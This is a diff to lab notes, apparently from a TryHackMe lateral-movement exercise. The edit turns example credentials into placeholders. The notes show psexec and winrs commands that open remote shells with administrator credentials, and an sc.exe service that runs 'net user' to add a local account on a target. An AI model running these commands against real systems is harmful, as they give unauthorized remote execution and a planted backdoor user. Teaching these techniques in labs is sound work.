@@ -13,7 +13,7 @@ The way psexec works is as follows:
 
 To run psexec, we only need to supply the required *administrator credentials* for the remote host and the *command we want to run.*
 ```shell-session
-psexec64.exe \\{MACHINE_IP} -u Administrator -p Mypass123 -i cmd.exe
+psexec64.exe \\{MACHINE_IP} -u {Administrator} -p {Mypass123} -i cmd.exe
 ```
 
 
@@ -25,7 +25,7 @@ Windows Remote Management (WinRM) is a web-based protocol *used to send Powershe
 
 To connect to a remote Powershell session from the command line, we can use the following command:
 ```shell-session
-winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+winrs.exe -u:{Administrator} -p:{Mypass123} -r:target cmd
 ```
 
 We can achieve the same from Powershell, but to pass different credentials, we will need to create a *PSCredential* object:
@@ -67,7 +67,7 @@ We can create a service on a remote host with *sc.exe*, a standard tool availabl
 
 We can create and start a service named "THMservice" using the following commands:
 ```shell-session
-sc.exe \\{TARGET} create {THMservice} binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\{TARGET} create {THMservice} binPath= "net user {munra Pass123} /add" start= auto
 sc.exe \\{TARGET} start {THMservice}
 ```
 The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.
